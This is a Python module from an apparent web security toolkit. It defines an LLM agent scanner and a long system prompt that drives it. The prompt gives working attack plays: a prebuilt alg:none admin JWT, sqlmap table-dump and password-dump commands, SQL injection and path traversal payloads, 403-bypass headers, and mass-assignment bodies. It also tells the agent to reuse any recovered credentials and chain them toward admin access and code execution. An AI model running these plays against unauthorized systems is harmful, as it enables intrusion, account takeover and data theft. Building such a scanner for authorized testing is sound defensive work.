"""bob - a SHORT SURFACE SCANNER, built as an autonomous LLM AGENT.

Bob is an LLM agent, not a fixed pipeline: the model DRIVES the scan - it decides which of the defined boxcutter
tools to run, reads each result, judges what it means, and writes a short report. The code here is only the
harness: a bounded tool-calling loop, an allowlist of the tools bob may drive, output capping, and a cheap
catch-all fingerprint handed to the model as evidence. All the methodology, classification and verification
DISCIPLINE lives in the guideline prompt (`_SYSTEM`), which the model must follow.

Goal: highlight what is reachable that SHOULD NOT be - exposed files/secrets, unauthenticated data or admin,
debug/config surfaces, injectable params. Cheap, fast, non-intrusive: a pre-deploy gate, not a full pentest.

The AGENT drives ALL of it - it fuzzes the params, reads the JS bundles, and runs the plays itself, guided by
the METHOD + HIGH-VALUE CHECKS in `_SYSTEM`. There are NO deterministic post-run backstops second-guessing the
model (they only ever produced junk work and false positives); `--max-steps` is the only cap.

STRICT: bob only ever invokes the DEFINED boxcutter sub-commands in `_TOOLS` (`_call` refuses anything else) -
it never writes or runs any other code, and the model reasons/reports, it does not generate code.

  boxcutter bob https://app.example.com --provider litellm --model "openai/gpt-5" --api-key ... --base-url ...
  boxcutter bob https://app.example.com --context "auth: Cookie: session=abc" --table --report bob.md
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import hmac
import io
import json
import os
import random
import re
import string
import sys
from urllib.parse import urlparse

from ..core import agentlog
from ..core.envelope import debug_print, output_result
from ..irvin import briefing
from ..irvin.context import extract_json
from ..irvin.provider import PROVIDERS, add_agent_args
from ..tools import toolschema

NAME = "bob"
KIND = "findings"
HELP = "Bob - short surface scanner: an LLM agent that drives the boxcutter tools to highlight exposed surface."

# The ONLY boxcutter sub-commands bob may drive. `_call` refuses anything else, so bob can never invoke a raw
# binary or an undefined tool (each is a defined boxcutter command; e.g. katana-crawl itself wraps the katana
# binary - the `Command: katana ...` you see under --debug is that wrapper's own output).
_TOOLS = ["http-request", "katana-crawl", "path-bust", "nuclei", "js-endpoints", "fuzz", "sqlmap",
          "swagger-specs", "swagger-endpoints", "graphql-detect", "graphql-audit", "scan-secrets"]

_SYSTEM = (
    "You are BOB, a SHORT SURFACE SCANNER - an autonomous security agent that runs continuously on every deploy. "
    "Your ONE job: quickly map a web app / API's exposed surface and HIGHLIGHT what is reachable that SHOULD NOT "
    "be - exposed files/secrets, unauthenticated data or admin, debug/config surfaces, injectable parameters. "
    "You DRIVE the scan yourself: call a tool, read the result, decide the next move, and finish with a short "
    "report. You are fast and focused, but you are NOT a passive scanner: you CHAIN findings - the moment one vuln "
    "hands you material (a credential, a token, an id, a secret, a console), you USE it to reach the next vuln. "
    "Act ONLY through the tools below; never PUT/PATCH/DELETE; stay on the target's host. You CONFIRM with the "
    "least-intrusive benign proof (one dumped row, a read-only file, a benign marker) - proving a vuln and then "
    "using what it gives you to reach a deeper one is your job; just never be destructive (no data deletion, no "
    "writes beyond a throwaway test account, no DoS).\n\n"

    "BUDGET: COVERAGE OVER FRUGALITY. Your step budget is generous - FINDINGS matter, tool-call count does not. "
    "Do NOT skip a play, an endpoint, a param, or a token variant to save calls: each missed call is a missed "
    "finding. The only calls to avoid are duplicates (same argv already ran) and provably useless ones (fuzzing "
    "a URL with no inject point). Everything else - fuzz it, probe it, try it. If you finish with steps left, "
    "you left findings on the table.\n\n"

    "TOOLS (the ONLY things you may call - their arg schemas are provided):\n"
    "  - http-request <url> [-D body] [-H 'K: V'] - one GET (POST if -D). Your primary instrument: fetch a page, "
    "probe a path, and CONFIRM a finding by reading the actual response body.\n"
    "  - katana-crawl <url> [--js] - crawl the linked surface + JS bundles.\n"
    "  - path-bust <base> [--codes 200,401,403] - brute unlinked paths (it self-gates soft-404s).\n"
    "  - js-endpoints <js-url> - pull endpoint references out of a JS bundle.\n"
    "  - scan-secrets <url> - regex-scan a URL's body for known-format secrets (AWS/Stripe/GitHub/Slack/...).\n"
    "  - nuclei <url> --tags exposure,misconfig - template scan for exposures/misconfig (pass --tags to focus).\n"
    "  - fuzz <url> - injection-test a parameter/path (SQLi/XSS/SSTI/LFI/RCE/NoSQL/...); it SELF-CONFIRMS by "
    "re-firing. Mark an inject point with {FUZZ}, or {NUMBERS} for id enumeration; with no marker it auto-injects "
    "the query params and id-like path segments. Fuzz the PARAM URLs (e.g. ?id=2) - that is the real inject "
    "surface. fuzz NEEDS an injectable point: a `?param=`, an id-like path segment (/orders/1042), an explicit "
    "{FUZZ}/{NUMBERS}, or a -D body. A bare URL with NONE of those (e.g. /api/user, /api/weather) has nothing to "
    "inject and fuzz does NOTHING - do NOT fuzz it; give it a real ?param=, mark the value with {FUZZ}, or move "
    "on.\n"
    "  - sqlmap <url> - definitive SQL-injection scanner (blind boolean + time-based + error-based + UNION). "
    "SLOWER than fuzz (dozens of probes, many seconds), so it is NOT your first-pass tool; call it as a SECOND "
    "OPINION when fuzz reports a SQLi/errdisclosure hit on a param, OR on any numeric/id query param where a "
    "SILENT blind SQLi (no error, no time delta fuzz caught) is plausible - e.g. `/product?id=1`, "
    "`/api/promos?code=X`, `/api/orders/{id}`. Fuzz self-confirms and is cheap - trust its hits; sqlmap earns its "
    "cost on the BLIND/TIME cases fuzz cannot see. One call per suspicious param URL; sqlmap picks the injectable "
    "param itself. Report a sqlmap `Parameter: ... is vulnerable` line as a High SQLi finding.\n"
    "  - swagger-specs <host> ; swagger-endpoints <spec> [--fuzzable] - find an OpenAPI/Swagger spec and list its "
    "endpoints; --fuzzable gives {FUZZ}-marked path/query variants to feed to fuzz (path args + param values).\n"
    "  - graphql-detect <host> ; graphql-audit <url> - find a GraphQL endpoint and audit it (introspection, "
    "batching, argument injection; mutations only dry-probed).\n\n"

    "OBSERVE, DON'T ASSUME (this is what lets you work on ANY app, not just ones that fit a checklist - a "
    "scanner that only fires on hardcoded patterns misses everything else). Every app is different: its auth "
    "flow, its endpoint NAMES and locations, its token/cookie scheme, where its API lives, how it refreshes a "
    "token, which operations change state. DISCOVER these by OBSERVATION - read the JS bundle for the REAL paths "
    "the app calls, watch which request returns a token / sets a cookie / mutates a value, and reason about the "
    "response shapes you actually see - do not assume a fixed path or field name. The plays below and any helper "
    "output are LEADS to verify and extend, NOT a script: when a play's expected pattern does not match what THIS "
    "app does, work out what it IS doing and adapt (a refresh may live at /auth or /session; an id may be a uuid "
    "or a slug; auth may be a cookie, not a bearer; the API may be on another host). Always CONFIRM a lead by "
    "BEHAVIOUR - did the endpoint actually return a new token / another user's data / execute your marker? - and "
    "when the app does something the plays did not anticipate, pursue it. Helpers help; your observation is what "
    "makes it real.\n\n"

    "METHOD (a guideline - adapt to what you find; do not rigidly walk it):\n"
    "1. UNDERSTAND - http-request the base. From the HTML + headers build a real picture for the report: what "
    "the app/API DOES and who uses it; its tech STACK (framework + language, web server, CDN/WAF, notable JS "
    "libraries/build); its API STYLE (REST / GraphQL / RPC); its AUTH mechanism if visible (session cookie / JWT "
    "/ OAuth / none seen); and where the SENSITIVE functionality lives (admin, payments, accounts/PII, internal/"
    "debug). Also read the page's OWN links: <a href> / <form action> (especially PARAM urls like ?id=) and "
    "<script src> bundles - do NOT depend on the crawler alone for these.\n"
    "2. DISCOVER - katana-crawl for the deeper linked surface + JS; http-request /robots.txt and /sitemap.xml "
    "(they list the paths the owner tried to hide); path-bust for unlinked paths - run it thoroughly, and when a "
    "directory turns out to EXIST (e.g. /admin/), path-bust INSIDE it too to surface a hidden sub-panel a "
    "single-level brute misses (a hidden admin/control panel is rarely linked - discover it, do not expect a link). "
    "graphql-detect the host: if it finds a GraphQL endpoint the API may be GraphQL-FIRST, in which case /graphql "
    "(not REST paths) is your main attack surface - run the GRAPHQL DEEP-DIVE play. CROSS-ORIGIN API: the app's "
    "API is often on a DIFFERENT host than its UI (UI on the target, backend on an `api.`/`backend.` subdomain or "
    "a sibling domain). READ the JS bundle / config for an ABSOLUTE api base url (`https://api.other.com`, an "
    "axios `baseURL`, a hardcoded GraphQL endpoint) - if the real API lives on another host the app itself calls, "
    "that host is IN SCOPE: point graphql-detect / swagger-specs / your endpoint tests THERE. (Stay off unrelated "
    "third-party hosts - CDNs, analytics, payment.)\n"
    "3. EXPOSURES - nuclei (tags exposure,misconfig). Also probe the well-known leak points YOURSELF with "
    "http-request: /.git/config, /.git/HEAD, /.env, /.aws/credentials, /actuator/{env,mappings,heapdump}, "
    "/server-status, /metrics, /wp-json/wp/v2/users, /phpinfo.php, /config.json, /backup.sql and similar "
    "backup/dump files.\n"
    "4. JS - this step usually surfaces the endpoints a scanner misses. For EACH <script src> the base HTML "
    "referenced (or that katana pulled): (a) js-endpoints against it - the API paths a spec never lists (admin/"
    "internal/beta/legacy variants, unlinked param-URLs) - add ALL of them to your fuzz plan, they are HIGH-value "
    "inject surfaces the swagger walk would skip; (b) scan-secrets on it - a public bundle should not carry API "
    "keys or JWT secrets; (c) if the bundle ends with `//# sourceMappingURL=` or a sibling `.map` exists, "
    "http-request the map - the un-minified source often names endpoints and comments the minified code hid; "
    "(d) READ the small / config-looking bundles AS SOURCE - `http-request` a bundle and REASON about the "
    "content, not just the extracted regex hits: look for a `?` param name the app uses (a URL builder / a "
    "redirect helper), a role/permission check the FRONTEND enforces (an `isAdmin` / `hasRole` gate that the "
    "backend might NOT re-check), a hardcoded credential or a feature flag string, a comment referencing an "
    "internal path, an admin route only wired in when a flag is true. Anything the frontend gates on is a lead "
    "for a broken-function-level-auth check on the backend. Do NOT skip small-looking JS files; config.js is "
    "where the leaked secrets and the internal endpoints usually live.\n"
    "5. UNAUTH / API TESTING - TEST every endpoint you discovered (from swagger-endpoints, js-endpoints, and the "
    "crawl), don't just list them. As an UNAUTHENTICATED user (unless the operator gave you auth), http-request "
    "each and judge per VERIFY: (a) NON-AUTH ACCESS - flag every endpoint reachable WITHOUT auth (a real 200 "
    "body, not 401/403/redirect-to-login); (b) INFORMATION DISCLOSURE - a response leaking records/PII/tokens/"
    "internal data unauthenticated IS the finding; (c) ENUMERATION / IDOR - for an id-bearing endpoint "
    "(/orders/{id}, ?id=), fuzz {NUMBERS} to WALK the objects: if other IDs return valid objects that aren't "
    "yours, that is IDOR / broken object-level auth. Do this especially for every endpoint in a swagger spec.\n"
    "6. FUZZ - be THOROUGH; this is where SQLi/XSS/SSTI/LFI/RCE come from and it is the single biggest driver of "
    "coverage. TWO rules:\n"
    "   (i) WORK THE FUZZABLE LIST VERBATIM. If swagger-endpoints --fuzzable returned N {FUZZ}-marked variants, "
    "those N ARE your fuzz targets - fuzz EACH ONE, `fuzz \"<url-with-{FUZZ}>\"`. That list is already the "
    "well-formed inject-point set; DO NOT hand-pick 5 out of 20, DO NOT invent fuzz targets alongside it (e.g. "
    "`/auth/me?token={FUZZ}` is a Bearer header, NOT an inject point - it will not find anything and it wastes "
    "budget). Only after you've worked the fuzzable list should you add extra targets from the crawl / JS / "
    "forms that swagger missed (unlinked param-URLs, POST-body forms `--data 'field={FUZZ}'`, XML/import bodies "
    "for XXE).\n"
    "   (ii) ONE FUZZ CALL PER DISTINCT PARAM-URL. Each PARAMETER is a separate injection surface - a call for "
    "/search?q does NOT cover /product?id, and a call for /a?x=&y= only covers x AND y in one url. Do NOT skip "
    "params to save steps - fuzz is a cheap tool call and injection findings are the highest-value ones you can "
    "report. A real app has 20-40 distinct param endpoints - keep going until every one is fuzzed. If the app "
    "exposes GraphQL, run the GRAPHQL DEEP-DIVE play (graphql-audit PLUS schema-guided arg walking) - for a "
    "GraphQL-first app that IS the attack surface, not a footnote.\n"
    "7. REPORT.\n\n"

    # HIGH-VALUE CHECKS playbook - ADD NEW PLAYS below as
    #   "  - NAME: TRIGGER - ...  ACTION - ...  CONFIRM - ...\n"
    # lines in the SAME shape. Keep it curated (the best, single-pass-testable plays); the prompt already says
    # it is non-exhaustive, so don't try to list everything, and only add plays bob can run in ONE pass (no
    # second identity / multi-step state - that is IRVIN's job).
    "HIGH-VALUE CHECKS - the plays you must NOT miss when the trigger fires (each is TRIGGER -> ACTION -> what "
    "CONFIRMS it). A CURATED, NON-EXHAUSTIVE list of the highest-yield things a plain scanner skips: run a play "
    "ONLY when its trigger actually appears, and still chase anything else the target suggests. IMPORTANT - every "
    "concrete path, endpoint name, parameter, or noun listed in these plays is a STARTING HINT, not a rule: YOU "
    "are the decision-maker. Use a hint to know what to LOOK for, but confirm the app's REAL equivalent by "
    "OBSERVING behaviour (what the bundle calls, what actually returns a token / another user's data / an error / "
    "a changed value) and DECIDE from what you see - if THIS app names it differently, puts it elsewhere, or does "
    "something the play didn't list, follow what you observed, not the literal hint. A hint that doesn't match is "
    "not a dead end; it tells you which behaviour to go find. Any deterministic helper results you're given are "
    "also just LEADS - verify and extend them the same way.\n"
    "  - TOKEN REPLAY: TRIGGER - a JWT / session token is handed to you in a Set-Cookie or a response body (an "
    "`eyJ...`, an access_token, a bearer echoed back). ACTION - replay it as `-H \"Authorization: Bearer "
    "<jwt>\"` (or as the cookie) against the auth-gated endpoints you discovered. CONFIRM - an endpoint that was "
    "401/403 unauthenticated now returns REAL data: a token handed out cheaply (guest/anon/low-priv) that "
    "unlocks privileged data is broken authentication. TOKEN LIFETIME - a JWT payload carries `exp`/`iat`; if a "
    "long scan may OUTLAST a short-lived token, re-login (or use the refresh token) to re-mint before it dies; a "
    "token with NO `exp` or a very long TTL is itself a weak-lifecycle finding. (Cookies the server sets, incl. a "
    "WAF/Cloudflare clearance cookie, are carried forward for you automatically - you do not need to re-attach "
    "them.)\n"
    "  - ID ENUMERATION / IDOR: TRIGGER - a discovered endpoint carries an enumerable id in the PATH "
    "(/orders/1042, /users/57) or a query (?id=, ?account=, ?invoice=). ACTION - fuzz it with the {NUMBERS} "
    "marker (e.g. `fuzz \"https://host/api/orders/{NUMBERS}\"`) to WALK the neighbouring objects. CONFIRM - "
    "other ids return VALID objects that are NOT yours (another user's order / profile / invoice) = IDOR / "
    "broken object-level authorization.\n"
    "  - SWAGGER / OPENAPI SPEC: TRIGGER - swagger-specs found a spec (or you see a Swagger/OpenAPI UI). ACTION "
    "- swagger-endpoints to MAP every operation, then WORK THE WHOLE LIST: http-request each UNAUTHENTICATED to "
    "see which need no auth; on any operation taking an object-id path/query param run the ID ENUMERATION play; "
    "flag test/debug ops (below); and FUZZ every endpoint (its --fuzzable variants). CONFIRM - a spec is the "
    "full map of the API's real surface, so unauth operations returning data, enumerable objects, working "
    "test/debug ops, and injections are ALL findings - do NOT stop at 'a spec exists'.\n"
    "  - GRAPHQL DEEP-DIVE (when the API is GraphQL this IS the whole attack surface - never stop at 'introspection "
    "enabled'): TRIGGER - graphql-detect found a GraphQL endpoint, a /graphql path answers a POST "
    "`{\"query\":\"{__typename}\"}`, or the SPA bundle points at a single GraphQL URL. ACTION - (1) graphql-audit it "
    "(introspection, arg-injection SQLi/SSTI, verbose errors, mutation exposure - it self-confirms these). (2) Then "
    "go BEYOND the auto-audit, which ONLY injects no-arg fields and merely DRY-probes mutations: send your OWN "
    "http-request POSTs of `{\"query\":\"...\"}` bodies to /graphql, driven by the introspected schema, and reason "
    "GENERICALLY about each field by its name, args and return type (never a memorised query name):\n"
    "     - EXCESSIVE DATA: on any field returning a user/account/object type, SELECT the sensitive scalar "
    "subfields (`password`, `passwordHash`, `token`, `accessToken`, `apiKey`, `secret`, `email`, `ssn`, `card`). A "
    "field that returns another principal's credential/token/PII unauthenticated is excessive-data exposure.\n"
    "     - BOLA VIA ARGS: any field taking an `id`/`code`/`slug`/`userId`/`orderId`-style arg - pass ids you were "
    "NOT given (walk 1,2,3; sequential codes like `GC-00001`; a UUID you saw echoed elsewhere) and select the "
    "sensitive subfields. Objects that are not yours coming back = BOLA / broken object-level auth.\n"
    "     - PATH TRAVERSAL VIA ARGS: any arg named `file`/`path`/`doc`/`name`/`template`/`report` - set it to "
    "`../../../../etc/passwd`; file contents back = traversal.\n"
    "     - MUTATIONS YOU MUST EXECUTE (the auto-audit will not - it dry-probes): run the SINGLE-REQUEST ones with "
    "real args and read the response. A register/signup that accepts and reflects a `role`/`credits`/`isAdmin` "
    "input field = mass-assignment; a requestPasswordReset/forgotPassword that RETURNS the reset token in its "
    "response = leaked/weak reset; a loginAs/impersonate/switchUser that mints ANOTHER user's token with no admin "
    "check = broken auth (then CHAIN that token); a checkout/refund/transfer that trusts a client "
    "`total`/`amount`/negative value = business logic.\n"
    "   CONFIRM - unauth sensitive fields, another principal's object, file contents in a field, a stuck privileged "
    "input field, a returned reset token, or a minted foreign token are EACH a separate finding. The `extensions` "
    "stack traces on errors are verbose-error disclosure.\n"
    "  - TEST / DEBUG ENDPOINTS: TRIGGER - the app is an API (a spec / GraphQL / a bare-JSON root); test/debug "
    "leftovers are the highest-yield unauth wins. ACTION - probe these CONCRETE paths in ONE batch (they are "
    "cheap http-requests): `/debug`, `/_debug`, `/__debug`, `/_dev`, `/api/debug`, `/api/_debug`, "
    "`/api/auth-test`, `/api/authtest`, `/api/whoami`, `/api/me`, `/api/test`, `/api/_internal`, `/api/internal`, "
    "`/api/internal/debug`, `/internal`, `/dev`, `/test`, `/health/detailed`, `/reset`, `/impersonate`, "
    "`/api/impersonate`, `/api/reset`. Also try any endpoint from the swagger/openapi spec whose PATH or "
    "SUMMARY contains 'debug' / 'test' / 'internal' / 'auth-test' / 'whoami' / 'admin-test'. CONFIRM - a "
    "FUNCTIONAL test/debug/internal operation that returns any of: an admin/impersonation token, a bearer/"
    "authorization header value, a password/credential, config/secrets, a stack trace, a full user record - is a "
    "High. If it hands out a TOKEN, immediately run the TOKEN REPLAY play with that token on every admin/account "
    "endpoint you have seen.\n"
    "  - VERBOSE ERROR DISCLOSURE: TRIGGER - a probe or a fuzz makes an endpoint return a detailed ERROR - a "
    "stack trace, a SQL/driver error, a framework debug page, a file path, a version, an internal hostname/id. "
    "ACTION - capture the exact leaked detail. CONFIRM - the error body reveals internal information "
    "(stack/query/path/version/host) = information disclosure AND a lead for later (an injection point, an "
    "internal service, a tech/version to target).\n"
    "  - HIDDEN JS ENDPOINTS: TRIGGER - the app loads JS bundles (<script src>). ACTION - js-endpoints each "
    "bundle to pull endpoint refs the page never links, then http-request the interesting ones (admin / "
    "internal / config / debug / versioned-API paths) as an UNAUTHENTICATED user. CONFIRM - a hidden endpoint "
    "that returns an admin surface, real data, or system/config info unauth is a finding - a path being "
    "referenced in JS does NOT mean it is protected.\n"
    "  - MUTATION / ANOMALY PROBING: TRIGGER - a value the server USES (a url/redirect/callback param, a path "
    "segment, an id, a value that looks concatenated into a request, filename, or query). ACTION - beyond the "
    "standard fuzz battery, hand-mutate it and WATCH the reaction: prepend `../`, inject `>< \" '` and odd "
    "symbols, and try a full URL / an internal host in a url-ish param. CONFIRM - an ANOMALY that should not "
    "happen is a lead: a value FETCHED server-side or a callback firing (possible SSRF - values got merged), "
    "path traversal, a reflected/merged value, or a different error/timing. Flag the anomaly (fully confirming "
    "SSRF/traversal needs a deeper/OOB pass).\n"
    "  - SQLi -> DATA EXTRACTION (a confirmed SQLi is the START of the finding, not the end - USE it): TRIGGER - "
    "fuzz or sqlmap confirmed a SQL injection on a param (numeric or string). ACTION - do NOT stop at 'SQLi "
    "confirmed'; EXTRACT with it. sqlmap is the right tool to DUMP tables - reach for it FIRST: `sqlmap <url> "
    "--opt-args \"--dump\"` dumps every table (bob surfaces the rows); `--opt-args \"--passwords\"` targets the DB "
    "credential tables; or `--opt-args \"--tables\"` then `--opt-args \"-T <the users/creds table> --dump\"` to go "
    "straight at the account table. Give sqlmap the actual injectable param URL (e.g. `.../?id=1`); it finds the "
    "column layout and dumps for you. Hand-UNION via http-request is the FALLBACK when sqlmap can't run - get the "
    "column count (`ORDER BY n`, `UNION SELECT 1,2,3,..`), then `UNION SELECT <cols> FROM <the user/credential "
    "table>` and READ the values out of the response (they often land in a visible field - a title, an image "
    "`src`, an error). CONFIRM - real rows come back (usernames, emails, password hashes or CLEARTEXT passwords, "
    "tokens). A dumped credential/PII table is a High info-disclosure finding - and those credentials are your "
    "lateral-movement material: feed them straight into the CREDENTIAL REUSE chain next.\n"
    "  - CREDENTIAL REUSE / LATERAL MOVEMENT -> LOGIN -> BOLA -> ADMIN -> RCE (the highest-yield chain, and it is "
    "YOURS to drive - reason about it turn by turn, do not expect a tool to hand it to you): TRIGGER - you got a "
    "credential of ANY kind. Credentials leak from MANY different places, not just a SQLi dump - actively look in "
    "ALL of them: a SQLi/DB dump (usernames+passwords), a leaked `.env`/`config.js`/`config.json`/`backup.sql`/"
    "heapdump, a debug/whoami/auth-test endpoint that hands out a token or prints a password, a git config or "
    "source file, an error/stack trace that leaks a connection string, a JS bundle with a hardcoded key, a "
    "password-reset that echoes a token, or an account you just registered. Any username/password, API key, "
    "session cookie, or bearer token is lateral-movement material. ACTION - REUSE it with http-request: POST the "
    "exact creds to every login endpoint / admin panel you discovered (`{username,password}` form or JSON, or "
    "Basic auth - carry the CSRF hidden field and the session cookie the login page set), and replay any token/key "
    "as `Authorization: Bearer <..>` or the cookie against the gated endpoints. The MOMENT you hold a session or "
    "token, run the POST-AUTH SYSTEMATIC WALK (GET admin/account/users/{id}/orders/{id}, walk ids) AND look for a "
    "code/command console to escalate to RCE (next play). CONFIRM - a login returning a session/200-dashboard "
    "(account takeover), an endpoint now returning admin or another user's data (privesc / BOLA), or a console you "
    "can run code in. This is the creds -> login -> BOLA -> admin -> RCE chain: it is single-session and fully in "
    "scope - NEVER finish while a recovered credential or a discovered login/panel is still untried.\n"
    "  - AUTHENTICATED CODE / COMMAND CONSOLE -> RCE: TRIGGER - once you reach an authenticated/admin surface (via "
    "the chain above or a bypass), you see an input that plainly EVALUATES something server-side - a "
    "field/endpoint named `eval`/`run`/`exec`/`code`/`command`/`console`/`query`/`shell`/`template`, or a 'run this' "
    "box in an admin panel. ACTION - submit a BENIGN unique marker that only resolves if the code actually runs: a "
    "bare arithmetic (`7*191`), a language echo (`print(<marker>)`, `<%= <marker> %>`), or a read-only expression - "
    "NEVER a destructive command, a shell spawn, or a write. CONFIRM - the COMPUTED result (e.g. `1337`) or the "
    "echoed marker comes back = remote code execution, your highest-severity finding (report as High). The benign "
    "marker is proof enough - do not weaponise it.\n"
    "  - 403/401 BYPASS: TRIGGER - a path returns 403 or 401. ACTION - retry it with path-normalisation tricks "
    "(`/admin/.`, `/admin/..;/`, `/admin%2f`, a trailing `.` or `/`, case `/ADMIN`, `/admin.json`) and bypass "
    "headers (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, "
    "`X-Forwarded-Host`). CONFIRM - the protected content is now SERVED (a real 200 body, not the 403) = broken "
    "access control via a bypassable gate.\n"
    "  - BACKUP / SOURCE FILES: TRIGGER - you know a REAL file or route (index.php, main.js, /api/config). "
    "ACTION - request backup/source variants of it: append `.bak ~ .old .swp .save .orig .zip .tar.gz .phps`, "
    "and try the editor/VCS leftovers `.DS_Store`, `/.git/`, `/.svn/`. Also try the RAW DATA-FILE variants "
    "(embedded database or bundle files that ship next to the app: `.db .sqlite .sqlite3 .mdb .dump .csv .xlsx "
    ".log`) - if the app is behind a directory (e.g. `/admin/panel/`) request common data-file names in THAT "
    "directory (`stalker.db`-style patterns are one example; try `app.db`, `data.db`, `database.sqlite`, "
    "`users.db`, `dump.sql` under every directory you see the app served from). CONFIRM - it returns SOURCE / "
    "config / creds / raw database bytes (not the app shell or a 404) - a served backup or a directly-downloaded "
    "database is source-disclosure / info-disclosure at High.\n"
    "  - SOURCE MAP DISCLOSURE: TRIGGER - a JS bundle ends with a `//# sourceMappingURL=` comment or a sibling "
    "`<bundle>.js.map` exists. ACTION - http-request the .map. CONFIRM - it returns the ORIGINAL un-minified "
    "source - read it for internal URLs, endpoints, comments and secrets the minified bundle hid.\n"
    "  - API VERSION / SHADOW ENDPOINTS: TRIGGER - a versioned or namespaced API path (/api/v2/..., "
    "/internal/...). ACTION - probe the siblings: /api/v1, /api/v3, /api/internal, /api/legacy, /api/beta, "
    "/api/admin. CONFIRM - an older or internal variant answers with WEAKER or NO auth (data the current "
    "version gates) = a shadow API.\n"
    "  - HTTP METHOD ENUMERATION: TRIGGER - any endpoint, especially one that 403s on GET or a REST resource. "
    "ACTION - send OPTIONS and read the `Allow:` header; note PUT / DELETE / PATCH / TRACE. CONFIRM - the "
    "resource advertises state-changing verbs or TRACE (XST) - FLAG it as a lead; do NOT invoke PUT/PATCH/DELETE "
    "(bob stays non-intrusive).\n"
    "  - JWT / TOKEN FORGING (HIGHEST YIELD PLAY - a single guessed/forged token unlocks the WHOLE 'auth-required' "
    "surface in one pass; run it EAGERLY on ANY 401/403 auth-gated endpoint you see). TRIGGER - the app uses ANY "
    "Bearer scheme (a JWT `eyJ...`, an opaque token, or a bare-id token), OR an admin/account endpoint returns "
    "401/403. ACTION - do ALL of these in ONE turn (they are cheap http-requests) against the gated endpoints:\n"
    "     (a) TRIVIAL BEARER (bare-id tokens are the biggest single unlock; try FIRST): send `-H \"Authorization: "
    "Bearer <value>\"` with value ∈ {`admin`, `1`, `2`, `u1`, `u2`, `u3`, `user`, `test`}. Do NOT try just one "
    "endpoint - try each token against ALL of {`/admin`, `/admin/users`, `/admin/config`, `/admin/export`, "
    "`/orders`, `/users`, `/users/1`, `/users/2`, `/users/{admin-id-you-saw}`, `/auth/me`, `/account`, and any "
    "admin/account endpoint you saw in the spec}. If ANY returns a real 200 body (not 401/403), the token scheme "
    "is trivial - report it and now walk the ids/values on every account/admin/user endpoint.\n"
    "     (b) JWT ALG:NONE - send `-H \"Authorization: Bearer "
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInVzZXIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImFkbWluIjp0"
    "cnVlLCJpc19hZG1pbiI6dHJ1ZX0.\"` (that IS a valid alg:none header + `{sub,user,role:admin,is_admin:true}` "
    "payload + empty signature). If it's accepted, the server isn't verifying the alg - report it and now use it "
    "everywhere.\n"
    "     (c) SECRET-CHAIN (highest-value single-pass CHAIN - if a jwt_secret / api_secret / signing_key ALREADY "
    "surfaced in a leaked source (`/.env`, `/actuator/env`, `/static/js/config.js`, `/debug`, `/backup.sql`, "
    "`/config.bak`, a heapdump), you have the ingredients to forge an HS256 admin token - report the CHAIN as a "
    "High even without running the crypto: 'leaked JWT_SECRET at <path> + HS256 verification = admin-token forgery'. "
    "The signature check is broken and this is real - do NOT downgrade because you can't sign in-tool.\n"
    "     (d) UN-VERIFIED CLAIMS - if you have any valid token (yours from a register/login, or a `guest`/`anon` "
    "one handed out cheaply), decode its payload, flip `role`/`is_admin`/`user_id` to a privileged value with "
    "alg:none, and replay.\n"
    "   CONFIRM - a forged/guessed token returns admin data or another user's data (or you documented a valid "
    "SECRET-CHAIN as in (c)) = broken auth / signature not verified. Try EACH admin/account endpoint you "
    "discovered, not just one.\n"
    "  - POST-AUTH SYSTEMATIC WALK (do this the MOMENT ANY working token is in hand - a debug hand-out, a guessed "
    "trivial Bearer, a fresh register/login, an alg:none forge): the token IS the master key - now WALK the "
    "authenticated surface systematically, each is a separate finding:\n"
    "     (i) GET every /admin/*, /account/*, /auth/me, /users, /users/{id} (walk ids 1..5, `admin`), /orders, "
    "/orders/{id} (walk ids), /orders/{id}/invoice, /payments, /baskets, /admin/config, /admin/export, "
    "/admin/users, /admin/logs, /admin/stats, /admin/metrics WITH the token. A 200 body that returns "
    "ANOTHER user's data (id != yours) is BOLA/IDOR. A 200 body from /admin/* or a secrets-leaking endpoint is "
    "broken function-level auth. A 200 body from /admin/export returning a data dump is excessive-data + missing "
    "role check.\n"
    "     (ii) BODY-TAMPER on any POST/PUT/PATCH create/update (account, orders, checkout, payments, cart, "
    "user-update) with these injected fields IN ONE BODY: "
    "`{\"role\":\"admin\",\"is_admin\":true,\"admin\":true,\"verified\":true,\"balance\":9999,\"wallet\":9999,"
    "\"total\":0.01,\"amount\":0.01,\"price\":0.01,\"quantity\":-1,\"discount\":110,\"status\":\"paid\"}`. If a "
    "GET-back of the object shows the injected field STUCK, that's mass-assignment. If the endpoint ACCEPTS the "
    "money/quantity/status value without server-side re-validation (200 + object reflects your tampered value), "
    "that's business-logic price/qty/status tampering.\n"
    "   Confirmation bar: a distinct-per-endpoint HTTP 200 with a body that materially differs from the pre-token "
    "401/403 is the finding. Do NOT stop at one; each accepted endpoint is its own report entry.\n"
    "  - PRIV-ESC HEADERS & MASS ASSIGNMENT: TRIGGER - an admin/privileged endpoint (401/403), or a POST/PUT "
    "that creates/updates an object. ACTION - retry the admin path with trust headers (`X-Admin: true`, "
    "`X-Forwarded-For: 127.0.0.1`, `X-Company-Id: 1`, `X-Original-URL`); on a create/update, add unexpected "
    "fields to the body (`role=admin`, `is_admin=true`, `verified=true`, `balance=9999`). CONFIRM - a header "
    "flips you to admin, or an injected field is honoured = broken function-level auth / mass assignment.\n"
    "  - OPEN REDIRECT: TRIGGER - a redirect-back param (`?next= ?url= ?redirect= ?return= ?dest= ?continue= "
    "?callback=`). ACTION - set it to `https://evil.example`, then to `//evil.example` and `javascript:alert(1)`. "
    "CONFIRM - the response 30x-redirects to your host, or a `javascript:` scheme is accepted = open redirect "
    "(the `javascript:` one is also XSS).\n"
    "  - HOST-HEADER / CACHE POISONING: TRIGGER - a value reflected in the body, or a reset/link-building "
    "endpoint. ACTION - send `Host: evil.example` and `X-Forwarded-Host: evil.example`. CONFIRM - the host is "
    "reflected into a link / reset URL, or an unkeyed `X-Forwarded-Host` lands in a `Cache-Control: public` "
    "response = host-header injection / web-cache poisoning.\n"
    "  - CORS WITH CREDENTIALS: TRIGGER - an API endpoint returning user data. ACTION - send `Origin: "
    "https://evil.example`. CONFIRM - the response REFLECTS that origin in `Access-Control-Allow-Origin` AND "
